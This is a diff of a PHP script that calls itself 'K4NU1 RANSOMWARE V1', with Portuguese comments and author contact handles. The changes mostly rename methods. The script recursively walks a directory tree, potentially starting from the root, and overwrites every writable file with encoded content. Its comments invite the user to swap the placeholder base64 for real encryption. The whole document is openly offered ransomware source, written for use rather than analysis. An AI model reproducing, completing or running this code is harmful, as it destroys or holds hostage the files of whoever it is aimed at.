@@ -1,17 +1,16 @@
 <?php
 /*
+if you don't speak portuguese use google translator!
+
 GITHUB:https://github.com/Kanui-C
 TELEGRAM:@bdpwd
 DISCORD:!TheKanui#0105
-
-
-
 */
 class ransomware{
     //Metodo Construtor
     public function __construct($alvo){
-        //Passa o argumento 1 para o metodo GetFile
-        $this->GetFile($alvo);
+        //Passa o argumento 1 para o metodo ObterArquivo
+        $this->ObterArquivo($alvo);
         //Banner =)
         echo "{K4NU1 RANSOMWARE V1 =) }\n";
     }
@@ -20,14 +19,14 @@ class ransomware{
         /*
         Use aqui a criptografia de sua peferencia
         (usei o base64 apenas para exemplo)
-        Retorna o conteudo criptografado para o metodo GetContent
+        Retorna o conteudo criptografado para o metodo ObterConteudo
         */
         return base64_encode($conteudo);
         
     
     }
     //Metodo responsavel por obter o conteudo do arquivo
-    public function GetContent($alvo){
+    public function ObterConteudo($alvo){
     //Abre o arquivo no modo de Leitura
     $arquivo = fopen($alvo, "rb");
     //Verifica se o arquivo foi aberto com sucesso
@@ -39,13 +38,13 @@ class ransomware{
     $conteudo = fread($arquivo, filesize($alvo));
     //Fecha o arquivo
     fclose($arquivo);
-    //Recebe o conteudo criptografado do metodo GetContent
+    //Recebe o conteudo criptografado do metodo ObterConteudo
     $criptografado = $this->criptografa($conteudo);
-    //Retorna o conteudo criptografado para o metodo GetFile(Variavel:criptografado)
+    //Retorna o conteudo criptografado para o metodo ObterArquivo(Variavel:criptografado)
     return $criptografado;
     }
     //Metodo responsavel por receber arquivos e diretorios
-    public function GetFile($dir){
+    public function ObterArquivo($dir){
         //Obtem todo o conteudo do diretorio passado (TENHA CUIDADO POIS ESSA FUNÇAO SE INICIA NO DIRETORIO /)
         foreach(glob($dir . DIRECTORY_SEPARATOR . "*") as $alvo){
             //Verificando se é arquivo ou diretorio
@@ -57,8 +56,8 @@ class ransomware{
                 de escrita
                 */
                 if($alvo != "." && $alvo != ".." && is_writable($alvo)){
-                  //Recebe o conteudo criptografado do metodo getcontent
-                  $criptografado = $this->GetContent($alvo);
+                  //Recebe o conteudo criptografado do metodo ObterConteudo
+                  $criptografado = $this->ObterConteudo($alvo);
                   /*
                   Abre o arquivo guardado na variavel alvo em modo de escrita
                   Obs:Quando o arquivo é aberto apenas usando w 
@@ -86,9 +85,9 @@ class ransomware{
             }else{
                 /*
                 Caso nao seja uma pasta ele ira retornar a mesma para o metodo
-                GetFile, Fazendo assim uma busca recursiva!
+                ObterArquivo, Fazendo assim uma busca recursiva!
                 */
-                $this->GetFile($alvo);
+                $this->ObterArquivo($alvo);
             }
         }
     }
@@ -96,8 +95,6 @@ class ransomware{
 //Caso o usuario passe menos de 2 argumentos exiba:
 if($argc < 2){
     echo "
-    Code owner:https://github.com/Kanui-C
-    
     É necessario passar o diretorio!\n
     It is necessary to pass the directory!\n
 
@@ -106,7 +103,6 @@ if($argc < 2){
 
     Tenha cuidado!\n
     Be Careful!\n
-    
     
     
     if you don't speak portuguese use google translator!\n
